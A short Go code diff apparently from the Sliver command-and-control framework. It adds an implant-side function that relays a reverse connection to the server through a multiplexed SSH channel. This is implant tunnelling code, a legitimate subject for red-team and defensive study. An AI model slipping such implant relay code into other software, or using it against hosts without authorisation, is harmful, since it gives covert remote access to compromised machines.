@@ -146,3 +146,38 @@ func (m *Comm) initSessionClient() (stream io.ReadWriteCloser, err error) {
 		return nil, errors.New("[mux] timed out waiting muxed stream for RPC C2 layer")
 	}
 }
+
+// handleReverse - A net.Conn and the info of its handler (a listener/dialer)
+// is passed to the implant comm and routed back to the server.
+func (m *Comm) handleReverse(h *sliverpb.Handler, conn net.Conn) {
+
+	// Populate the connection info with all details from the handler struct:
+	// we assume all fields are good, otherwise the server/implant would have returned before.
+	info := &sliverpb.ConnectionInfo{
+		ID:          h.ID,
+		Transport:   h.Transport,
+		Application: h.Application,
+		LHost:       h.LHost,
+		LPort:       h.LPort,
+		RHost:       h.RHost,
+		RPort:       h.RPort,
+	}
+	data, _ := proto.Marshal(info)
+
+	// Create muxed channel and pipe.
+	dst, reqs, err := m.sshConn.OpenChannel("handler", data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Failed to open channel: %s", err.Error())
+		// {{end}}
+		err = conn.Close()
+		// {{if .Config.Debug}}
+		log.Printf("Failed to open channel: %s", err.Error())
+		// {{end}}
+		return
+	}
+	go ssh.DiscardRequests(reqs)
+
+	// Pipe the connection.
+	transport(conn, dst)
+}
